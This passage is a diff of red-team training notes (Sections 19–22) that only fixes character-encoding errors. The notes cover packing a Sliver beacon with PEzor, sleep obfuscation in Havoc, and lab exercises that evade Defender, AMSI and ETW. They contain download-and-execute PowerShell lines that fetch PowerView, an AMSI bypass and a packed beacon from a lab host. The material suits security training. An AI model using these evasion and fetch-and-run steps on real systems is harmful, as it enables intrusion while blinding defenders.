 sliver (beacon) > execute-assembly ~/tools/SharpHound.exe -c All --zip
 ```
 
-**Important**: Donut-generated shellcode has its own signatures now â€” Microsoft and AV vendors have signatured common Donut stubs. Test your shellcode with ThreatCheck after generating it. You may need to encrypt the shellcode payload inside the Donut wrapper.
+**Important**: Donut-generated shellcode has its own signatures now — Microsoft and AV vendors have signatured common Donut stubs. Test your shellcode with ThreatCheck after generating it. You may need to encrypt the shellcode payload inside the Donut wrapper.
 
 ---
 
-## SECTION 19 â€” PEzor: Automated Packing
+## SECTION 19 — PEzor: Automated Packing
 
-**ðŸ”· WHAT**
+**🔷 WHAT**
 
 PEzor is a shellcode and PE packer that automates multiple evasion techniques in a single command. It takes a binary or shellcode as input and applies a configurable chain of transforms:
 
 | PEzor flag | What it does |
 |---|---|
 | `-unhook` | Removes userland API hooks placed by EDRs when the loader starts |
-| `-antidebug` | Detects if a debugger is attached and exits â€” slows analyst reversing |
+| `-antidebug` | Detects if a debugger is attached and exits — slows analyst reversing |
 | `-syscalls` | Uses direct syscalls instead of hooked Windows API functions |
-| `-sleep=N` | Sleeps N seconds before executing â€” bypasses sandbox time limits |
-| `-text` | Stores shellcode in the `.text` section (executable) vs `.data` â€” bypasses some injection detection |
-| `-sgn` | Applies Shikata Ga Nai encoding â€” polymorphic XOR encoder |
+| `-sleep=N` | Sleeps N seconds before executing — bypasses sandbox time limits |
+| `-text` | Stores shellcode in the `.text` section (executable) vs `.data` — bypasses some injection detection |
+| `-sgn` | Applies Shikata Ga Nai encoding — polymorphic XOR encoder |
 
-**ðŸ”¶ WHY**
+**🔶 WHY**
 
-Instead of manually finding signatures and patching them, PEzor applies a known-good combination of evasion transforms that collectively defeat most default AV/EDR configurations. It is a force multiplier â€” what would take hours of manual ThreatCheck iteration and custom code takes one command.
+Instead of manually finding signatures and patching them, PEzor applies a known-good combination of evasion transforms that collectively defeat most default AV/EDR configurations. It is a force multiplier — what would take hours of manual ThreatCheck iteration and custom code takes one command.
 
-**âš”ï¸ HOW**
+**⚔️ HOW**
 
 Install PEzor on Kali:
 
@@ -1376,7 +1376,7 @@ Install PEzor on Kali:
 git clone https://github.com/phra/PEzor ~/tools/PEzor
 cd ~/tools/PEzor
 bash install.sh
-# Installation installs dependencies including Nim, MinGW, etc. â€” takes ~5 minutes
+# Installation installs dependencies including Nim, MinGW, etc. — takes ~5 minutes
 ```
 
 Pack your Sliver beacon:
@@ -1384,7 +1384,7 @@ Pack your Sliver beacon:
 ```bash
 cd ~/tools/PEzor
 
-# Basic â€” apply unhooking + direct syscalls + sleep
+# Basic — apply unhooking + direct syscalls + sleep
 ./PEzor.sh -unhook -syscalls -sleep=3 ~/lab/amsi/beacon_raw.exe
 
 # Output: beacon_raw.exe.packed.exe
@@ -1394,7 +1394,7 @@ ls -lh beacon_raw.exe.packed.exe
 cp beacon_raw.exe.packed.exe ~/lab/amsi/beacon_packed.exe
 ```
 
-On Windows VM â€” test the packed beacon:
+On Windows VM — test the packed beacon:
 
 ```powershell
 # Download the packed beacon
@@ -1403,7 +1403,7 @@ On Windows VM â€” test the packed beacon:
     'C:\Temp\beacon_packed.exe'
 )
 
-# Run it â€” watch for Defender alert vs C2 callback
+# Run it — watch for Defender alert vs C2 callback
 C:\Temp\beacon_packed.exe
 ```
 
@@ -1420,22 +1420,22 @@ C:\Temp\ThreatCheck.exe -f C:\Temp\beacon_packed.exe -e Defender
 
 ---
 
-## SECTION 20 â€” Sleep Obfuscation: Hiding From Memory Scanners
+## SECTION 20 — Sleep Obfuscation: Hiding From Memory Scanners
 
-**ðŸ”· WHAT**
+**🔷 WHAT**
 
-Modern EDRs do not just scan files â€” they also **scan process memory** periodically looking for shellcode patterns. Your beacon is sitting in memory between check-ins. Its shellcode has a known signature. The memory scanner finds it and kills the beacon.
+Modern EDRs do not just scan files — they also **scan process memory** periodically looking for shellcode patterns. Your beacon is sitting in memory between check-ins. Its shellcode has a known signature. The memory scanner finds it and kills the beacon.
 
 Sleep obfuscation solves this by **encrypting the beacon's own shellcode in memory while it sleeps**, then decrypting it just before executing the next task.
 
 ```
 Normal beacon memory during sleep:
-  Address 0x1A2B3C: 4D 5A 90 00 03 00 00 00 ...  â† recognisable Sliver shellcode
-  Memory scanner: "Sliver shellcode detected in powershell.exe" â†’ kill
+  Address 0x1A2B3C: 4D 5A 90 00 03 00 00 00 ...  ← recognisable Sliver shellcode
+  Memory scanner: "Sliver shellcode detected in powershell.exe" → kill
 
 Sleep-obfuscated beacon during sleep:
-  Address 0x1A2B3C: F3 7A 01 C9 AA 44 B2 1F ...  â† XOR'd with random key, looks random
-  Memory scanner: "random bytes â€” not recognised" â†’ no alert
+  Address 0x1A2B3C: F3 7A 01 C9 AA 44 B2 1F ...  ← XOR'd with random key, looks random
+  Memory scanner: "random bytes — not recognised" → no alert
 
 Beacon wakes up:
   XOR-decrypt own shellcode in memory
@@ -1443,19 +1443,19 @@ Beacon wakes up:
   XOR-encrypt own shellcode again before sleeping
 ```
 
-**ðŸ”¶ WHY**
+**🔶 WHY**
 
-The encrypt-on-sleep technique means the malicious signature only exists in memory for the milliseconds between wake and sleep â€” the active execution window. A scanner that runs every 30 seconds is unlikely to catch those milliseconds.
+The encrypt-on-sleep technique means the malicious signature only exists in memory for the milliseconds between wake and sleep — the active execution window. A scanner that runs every 30 seconds is unlikely to catch those milliseconds.
 
-**âš”ï¸ HOW**
+**⚔️ HOW**
 
-Sleep obfuscation is implemented inside the C2 implant loader. You do not configure it manually â€” you choose a C2 framework that supports it.
+Sleep obfuscation is implemented inside the C2 implant loader. You do not configure it manually — you choose a C2 framework that supports it.
 
 **Havoc (best free option for sleep obfuscation):**
 
 ```bash
 # When creating a Havoc Demon payload, configure:
-# Injection â†’ Sleep Technique: Ekko (or Foliage for better stealth)
+# Injection → Sleep Technique: Ekko (or Foliage for better stealth)
 # Ekko: uses Windows timer queue + ROP chain to encrypt shellcode during timer sleep
 # Foliage: uses APC (asynchronous procedure calls) for the encrypt/sleep/decrypt cycle
 ```
@@ -1464,9 +1464,9 @@ What Ekko does internally:
 
 ```
 Demon wakes from sleep
-        â†“
+        ↓
 Completes task
-        â†“
+        ↓
 Before sleeping:
   1. Creates a timer queue
   2. Queues 3 APCs:
@@ -1480,17 +1480,17 @@ Before sleeping:
   7. Demon executes next task
 ```
 
-During step 5 (the actual sleep), the shellcode in memory is encrypted â€” no scanner can match it against a known signature.
+During step 5 (the actual sleep), the shellcode in memory is encrypted — no scanner can match it against a known signature.
 
 **For the exam**: Sliver without sleep obfuscation is usually sufficient for CRTeamer because the exam environment is not likely running continuous memory scanning. But understanding this concept lets you choose the right C2 for more advanced engagements.
 
 ---
 
-## SECTION 21 â€” Lab: Building Your Evasion Toolkit
+## SECTION 21 — Lab: Building Your Evasion Toolkit
 
 This exercise ties together everything from Phase 04. Complete it in order.
 
-### Exercise A â€” Baseline: What fails without any evasion?
+### Exercise A — Baseline: What fails without any evasion?
 
 Revert your Windows VM to the clean snapshot. On the VM:
 
@@ -1506,9 +1506,9 @@ IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/PowerVi
 # Result: ____ (caught / ran?)
 ```
 
-Write down what was caught and what the Defender alert name was (check Windows Security â†’ Protection History).
+Write down what was caught and what the Defender alert name was (check Windows Security → Protection History).
 
-### Exercise B â€” Apply AMSI bypass, retest
+### Exercise B — Apply AMSI bypass, retest
 
 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/bypass2.ps1')
@@ -1517,7 +1517,7 @@ Get-Domain
 # What changed? Why did PowerView now load?
 ```
 
-### Exercise C â€” Fix the beacon
+### Exercise C — Fix the beacon
 
 ```bash
 # On Kali
@@ -1537,9 +1537,9 @@ C:\Temp\v2.exe
 # Did you get a Sliver callback?
 ```
 
-Keep iterating (ThreatCheck â†’ fix â†’ retest) until you get a live C2 callback.
+Keep iterating (ThreatCheck → fix → retest) until you get a live C2 callback.
 
-### Exercise D â€” Full bypass stack + in-memory tool loading
+### Exercise D — Full bypass stack + in-memory tool loading
 
 With your beacon active:
 
@@ -1557,7 +1557,7 @@ If any step fails, check which layer caught it (Defender alert? AMSI? ETW?) and 
 
 ---
 
-## SECTION 22 â€” Complete Phase 04 Mastery Checklist
+## SECTION 22 — Complete Phase 04 Mastery Checklist
 
 You are ready to move to Phase 05 when you can answer every item below **without looking at these notes**:
 
@@ -1589,16 +1589,16 @@ You are ready to move to Phase 05 when you can answer every item below **without
 
 ---
 
-## Additional Resources â€” Phase 04 Complete
+## Additional Resources — Phase 04 Complete
 
 | Resource | What it gives you |
 |---|---|
 | [ired.team: ETW Bypass](https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++) | Deep ETW + unhooking reference |
-| [ThreatCheck GitHub](https://github.com/rasta-mouse/ThreatCheck) | Source code â€” read it to understand how binary search scanning works |
+| [ThreatCheck GitHub](https://github.com/rasta-mouse/ThreatCheck) | Source code — read it to understand how binary search scanning works |
 | [Donut GitHub](https://github.com/TheWover/donut) | Read the README for all conversion options |
 | [PEzor GitHub](https://github.com/phra/PEzor) | Source + documentation for each flag |
 | [Havoc C2](https://github.com/HavocFramework/Havoc) | Built-in sleep obfuscation (Ekko, Foliage) |
 | [S3cur3Th1sSh1t: AMSI bypass roundup](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification) | Overview of every major bypass category with detection notes |
-| [AMSI.fail](https://amsi.fail) | Generate a random AMSI bypass â€” compare its approach to what you built |
+| [AMSI.fail](https://amsi.fail) | Generate a random AMSI bypass — compare its approach to what you built |
 | [THM: AV Evasion: Shellcode](https://tryhackme.com/room/avevasionshellcode) | Hands-on lab covering shellcode loaders + evasion |
 | [THM: Obfuscation Principles](https://tryhackme.com/room/obfuscationprinciples) | String and binary obfuscation techniques guided lab |
